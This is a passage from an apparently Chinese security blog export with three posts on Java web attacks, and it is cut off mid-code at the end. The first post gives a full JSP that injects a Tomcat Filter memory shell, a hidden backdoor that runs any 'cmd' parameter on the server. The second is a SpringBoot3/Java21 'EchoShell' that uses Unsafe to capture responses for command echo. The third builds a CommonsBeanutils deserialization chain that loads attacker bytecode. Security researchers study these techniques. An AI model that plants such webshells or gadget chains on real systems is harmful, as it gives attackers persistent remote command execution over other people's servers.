contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%!<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TrojanFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>      <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>      <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">try</span> (<span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream(), <span class="hljs-string">&quot;GBK&quot;</span>));<br>             <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(response.getOutputStream(),<span class="hljs-string">&quot;GBK&quot;</span>))) &#123;<br><br>          printWriter.write(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br><br>          String line;<br>          <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>) &#123;<br>            printWriter.println(line);<br>          &#125;<br><br>          printWriter.write(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>          printWriter.flush();<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>          e.printStackTrace();<br>        &#125;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 继续过滤链</span><br>        chain.doFilter(request, response);<br>      &#125;<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>  &#125;<br>%&gt;<br><br><br>&lt;%<br>  <span class="hljs-comment">//动态注册Filter</span><br>  <span class="hljs-comment">//1.获取context</span><br>  <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> request.getServletContext();<br>  <span class="hljs-type">Field</span> <span class="hljs-variable">applicationContextField</span> <span class="hljs-operator">=</span> servletContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>  applicationContextField.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">applicationContext</span> <span class="hljs-operator">=</span> (ApplicationContext) applicationContextField.get(servletContext);<br><br>  <span class="hljs-type">Field</span> <span class="hljs-variable">standardContextField</span> <span class="hljs-operator">=</span> applicationContext.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>  standardContextField.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-type">StandardContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (StandardContext) standardContextField.get(applicationContext);<br><br>  <span class="hljs-comment">//2.addFilterDef</span><br>  <span class="hljs-type">FilterDef</span> <span class="hljs-variable">filterDef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterDef</span>();<br>  filterDef.setFilter(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TrojanFilter</span>());<br>  filterDef.setFilterName(<span class="hljs-string">&quot;TrojanFilter&quot;</span>);<br>  filterDef.setFilterClass(TrojanFilter.class.getName());<br>  context.addFilterDef(filterDef);<br><br>  <span class="hljs-comment">//3.addFilterMap</span><br>  <span class="hljs-type">FilterMap</span> <span class="hljs-variable">filterMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FilterMap</span>();<br>  filterMap.setFilterName(<span class="hljs-string">&quot;TrojanFilter&quot;</span>);<br>  filterMap.addURLPattern(<span class="hljs-string">&quot;/*&quot;</span>);<br>  context.addFilterMap(filterMap);<br><br>  <span class="hljs-comment">//4.封装filterDef为ApplicationFilterConfig类的对象</span><br>  <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);<br>  constructor.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-type">ApplicationFilterConfig</span> <span class="hljs-variable">filterConfig</span> <span class="hljs-operator">=</span> (ApplicationFilterConfig) constructor.newInstance(context,filterDef);<br><br>  <span class="hljs-comment">//5.在context对象的filterConfigs属性中添加上我们构造好的ApplicationFilterConfig类的对象</span><br>  <span class="hljs-type">Field</span> <span class="hljs-variable">Configs</span> <span class="hljs-operator">=</span> context.getClass().getDeclaredField(<span class="hljs-string">&quot;filterConfigs&quot;</span>);<br>  Configs.setAccessible(<span class="hljs-literal">true</span>);<br>  <span class="hljs-type">Map</span> <span class="hljs-variable">filterConfigs</span> <span class="hljs-operator">=</span> (Map) Configs.get(context);<br>  filterConfigs.put(<span class="hljs-string">&quot;TrojanFilter&quot;</span>,filterConfig);<br><br>%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.bilibili.com/video/BV1E84y1w77R/?share_source=copy_web&vd_source=69bbab612e2d116c463ccdb5d55ddce6">java内存马专题1-servlet内存马</a></p>
<p><a href="https://github.com/Y4tacker/JavaSec/blob/main/5.%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/Tomcat/Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC.md">Tomcat-Filter型内存马</a></p>
<p><a href="https://drun1baby.top/2022/08/22/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-03-Tomcat-%E4%B9%8B-Filter-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/#%E5%B0%8F%E7%BB%93%E4%B8%80%E4%B8%8B%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B">Java内存马系列-03-Tomcat 之 Filter 型内存马</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot3×java21下ThreadLocal Response回显</title>
    <url>/2024/08/18/JAVA%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/SpringBoot3%C3%97java21%E4%B8%8BThreadLocal%20Response%E5%9B%9E%E6%98%BE/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天看了pop师傅的<a href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">Tomcat内存马回显技术</a>,利用ThreadLocal Response回显的时候，他换成低版本的SpringBoot和Java版本了(其实也就是kingkk师傅提出的tomcat回显得的方法)。因为现在SpringBoot3最低使用java17,反射修改private static final的方法在高版本下已经失效了。所以之前的代码已经不适用了，于是我就想着能不能在springboot3和java21实现一样的功能，刚开始自己没有构造出来，在ABU师傅的帮助下才写出来，于是也就有了这篇文章。主要是记录自己学习的过程。</p>
<h1 id="ThreadLocal-Response回显"><a href="#ThreadLocal-Response回显" class="headerlink" title="ThreadLocal Response回显"></a>ThreadLocal Response回显</h1><p>低版本下就不多赘述说了，可以看pop师傅的文章，这里主要介绍高版本下如何解决报错问题</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.echon;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.ServletRequest;<br><span class="hljs-keyword">import</span> jakarta.servlet.ServletResponse;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;<br><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EchoShell</span> &#123;<br>    <span class="hljs-comment">//获取unSafe对象，因为Unsafe类中恰好可以修改偏移量</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (Unsafe) unsafeField.get(<span class="hljs-literal">null</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFinalStatic</span><span class="hljs-params">(Unsafe unsafe, Field field, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">fieldBase</span> <span class="hljs-operator">=</span> unsafe.staticFieldBase(field);<br>            <span class="hljs-type">long</span> <span class="hljs-variable">fieldOffset</span> <span class="hljs-operator">=</span> unsafe.staticFieldOffset(field);<br>            unsafe.putObject(fieldBase, fieldOffset, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDispatcherWrapsSameObjectTrue</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> Thread.currentThread();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;contextClassLoader&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        obj = field.get(obj);<br><br>        field = obj.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;resources&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        obj = field.get(obj);<br><br>        field = obj.getClass().getDeclaredField(<span class="hljs-string">&quot;context&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">StandardContext</span> <span class="hljs-variable">standardContext</span> <span class="hljs-operator">=</span> (StandardContext) field.get(obj);<br>        standardContext.setDispatcherWrapsSameObject(<span class="hljs-literal">true</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/shell&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br><br>        <span class="hljs-comment">//获取当前的类, 通过 Unsafe 修改 Class 的模块：</span><br>        Module baseModule=Object.class.getModule();<br>        Class&lt;?&gt; currentClass= EchoShell.class;<br>        <span class="hljs-type">long</span> addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(<span class="hljs-string">&quot;module&quot;</span>));<br>        unsafe.getAndSetObject(currentClass,addr,baseModule);<br><br>        <span class="hljs-comment">// 获取 ApplicationFilterChain 的私有字段</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedRequestField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedRequest&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">lastServicedResponseField</span> <span class="hljs-operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="hljs-string">&quot;lastServicedResponse&quot;</span>);<br><br>        <span class="hljs-comment">// 设置字段可访问</span><br>        lastServicedRequestField.setAccessible(<span class="hljs-literal">true</span>);<br>        lastServicedResponseField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// 获取 lastServicedRequest 和 lastServicedResponse 变量</span><br>        ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="hljs-literal">null</span>);<br>        ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-comment">// 修改 dispatcherWrapsSameObject 的值为 true</span><br>        setDispatcherWrapsSameObjectTrue();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> lastServicedRequest.get() != <span class="hljs-literal">null</span><br>                ? lastServicedRequest.get().getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)<br>                : <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (lastServicedResponse.get() == <span class="hljs-literal">null</span> || lastServicedRequest.get() == <span class="hljs-literal">null</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;in&quot;</span>);<br>            <span class="hljs-comment">//反射修改private static final 修饰的lastServicedRequest和lastServicedResponse</span><br>            setFinalStatic(unsafe, lastServicedRequestField, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br>            setFinalStatic(unsafe, lastServicedResponseField, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadLocal</span>&lt;&gt;());<br><br>        &#125;<span class="hljs-keyword">if</span>(cmd!=<span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-keyword">try</span>&#123;<br>                <span class="hljs-type">ServletResponse</span> <span class="hljs-variable">responseFacade</span> <span class="hljs-operator">=</span> lastServicedResponse.get();<br>                System.out.println(responseFacade);<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/08/image-20240818151142566.png" alt="image-20240818151142566"></p>
<p>其实主要解决了两个问题</p>
<ol>
<li>反射修改private static final的方法在高版本下已经失效。</li>
<li>如何修改dispatcherWrapsSameObject值为true的问题。</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/7348?time__1311=n4+xnD0Dy7=Yq0KitD/iW+RxIr4vDBADWweYID#toc-3">Tomcat中一种半通用回显方法</a></p>
<p> <a href="https://www.cnblogs.com/cnsevennight/p/17446891.html">JDK高版本反射修改 private static fianl 修饰的对象</a></p>
<p><a href="https://boogipop.com/2023/03/02/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/">Tomcat内存马回显技术</a></p>
]]></content>
      <categories>
        <category>JAVA</category>
      </categories>
      <tags>
        <tag>JAVA安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化CommonsBeanutils链</title>
    <url>/2024/06/08/JAVA%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CB%E9%93%BE/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code> CommonsBeanutils</code>属于<code>Apache Commons </code>工具集下的一个项目，它和<code>Commons-Collections</code>很像，也是对JAVA内置功能的加强，CC是对JAVA集合类的增强，CB是对<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680">JavaBean</a>的加强。</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs shello">&lt;dependencies&gt;<br>       &lt;dependency&gt;<br>           &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;<br>           &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;<br>           &lt;version&gt;1.9.2&lt;/version&gt;<br>       &lt;/dependency&gt;<br> &lt;dependencies&gt;      <br></code></pre></td></tr></table></figure>

<h3 id="getter和setter"><a href="#getter和setter" class="headerlink" title="getter和setter"></a>getter和setter</h3><p>接着我们可以通过一个简单的示例实际的了解一下，下面代码定义了一个 Person类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;Sp4rks3&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>在该类中，定义了一个私有属性<code>name</code>和两个方法：读取<code>name</code>和设置<code>name</code>。在 Java 中，我们把符合驼峰式命名法，以 get 开头的方法名叫做<code>getter</code>，以 set 开头的方法名叫做<code>setter</code>。</p>
<p><code>CommonsBeanutils</code>为开发人员提供了一个静态方法：<code>PropertyUtils.getProperty()</code>，通过该方法可以调用任意<code>JavaBean</code>中的<code>getter()</code>方法。因此我们可以通过如下代码调用 User 类的<code>getName()</code>方法获取 username 的值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">System.out.println(PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(),<span class="hljs-string">&quot;name&quot;</span>));<br></code></pre></td></tr></table></figure>

<p>相当于我传入一个字符串，它就会动态的执行函数，这样就会让我们想到会不会有安全问题</p>
<hr>
<p><img src="https://image.sp4rks.xyz/2024/06/2024-06-07%20104831.png" alt="2024-06-07 104831"></p>
<p>我们传入的是 <code>name</code>，但是返回的是gette方法和setter方法的名字 还返回了Bean的属性值的名字。</p>
<p>(大写的<code>Name</code>，实际是<code>javabean</code>的默认格式，就是传进来小写，但是会将第一个字母变为大写，变为<code>Name</code>)</p>
<hr>
<p><code>PropertyUtilsBean</code>中看到了调用的地方，意思就是对我们传递的对象，调用一个符合JavaBean的方法(getter方法)</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214037301.png" alt="image-20240606214037301"></p>
<h2 id="CommonsBeanUtils利用链分析"><a href="#CommonsBeanUtils利用链分析" class="headerlink" title="CommonsBeanUtils利用链分析"></a>CommonsBeanUtils利用链分析</h2><p>CC3中提到了<code>Templateslmpl</code>类，它里面有<code>getOutputProperties()</code>方法,而<code>getOutputProperties()</code>名字正好满足getter方法的定义且<code>newTransformer()</code>是可以动态加载类的</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214356953.png" alt="image-20240606214356953"></p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606214757835.png" alt="image-20240606214757835"></p>
<h3 id="TemplatesImpl调用链"><a href="#TemplatesImpl调用链" class="headerlink" title="TemplatesImpl调用链"></a>TemplatesImpl调用链</h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">TemplatesImpl#</span><span class="language-bash">getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">TemplatesImpl#</span><span class="language-bash">getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">TransletClassLoader#defineClass()</span><br></code></pre></td></tr></table></figure>

<p>所以<code>PropertyUtils.getProperty(o1, property)</code>这段代码，当o1是一个 <code>TemplatesImpl</code>对 象，而 property 的值为<code>outputProperties</code>时，将会自动调用getter，也就是 <code>TemplatesImpl.getOutputProperties()</code>方法，触发代码执行。</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240606220701527.png" alt="image-20240606220701527"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.System.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>		<span class="hljs-comment">//TemplatesImpl3后段代码执行部分</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        PropertyUtils.getProperty(templates,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>接着就是找在哪调用了<code>getProperty()</code>,在<code>BeanComparator.compare()</code>中找到了调用<code>getProperty()</code>的地方</p>
<p><img src="https://image.sp4rks.xyz/2024/06/image-20240607184303226.png" alt="image-20240607184303226"></p>
<p><code>compare()</code>我们也很熟悉了，在<a href="https://sp4rks3.github.io/2024/06/01/JAVA%E5%AE%89%E5%85%A8/CC4/">Java反序列化CommonsCollections篇-CC4</a>有提到compare，compare的方法调用是这样的</p>
<p><img src="https://image.sp4rks.xyz/2024/06/6.png" alt="6"></p>
<h3 id="链子流程"><a href="#链子流程" class="headerlink" title="链子流程"></a>链子流程</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">PriorityQueue.readObject()<br>	PriorityQueue.heapify()<br>		PriorityQueue.siftDown()<br>			PriorityQueue.siftDownUsingComparator()<br>				BeanComparator.compare()<br>					PropertyUtils.getProperty(TemplatesImpl, outputProperties)<br>    <br>						TemplatesImpl.getOutputProperties()<br>							TemplatesImpl.newTransformer()<br>								TemplatesImpl.getTransletInstance()<br>									TemplatesImpl.defineTransletClasses()<br></code></pre></td></tr></table></figure>

<p><img src="https://image.sp4rks.xyz/2024/06/CB1.png" alt="CB1"></p>
<h2 id="CommonsBeanUtils链实现"><a href="#CommonsBeanUtils链实现" class="headerlink" title="CommonsBeanUtils链实现"></a>CommonsBeanUtils链实现</h2><p>尝试按照上面的逻辑写</p>
<h3 id="未找到方法的错误"><a href="#未找到方法的错误" class="headerlink" title="未找到方法的错误"></a>未找到方法的错误</h3><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//TemplatesImpl3后段代码执行部分</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;C://Users//14341//Desktop/Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><span class="hljs-comment">//        PropertyUtils.getProperty(templates,&quot;outputProperties&quot;);</span><br>        <br>        <span class="hljs-comment">//CB的部分</span><br>        BeanComparator&lt;Object&gt; beanComparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>&lt;&gt;(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>		<br>		<span class="hljs-comment">//CC4的逻辑部分</span><br>        PriorityQueue&lt;Object&gt; priorityQueue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(beanComparator);<br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 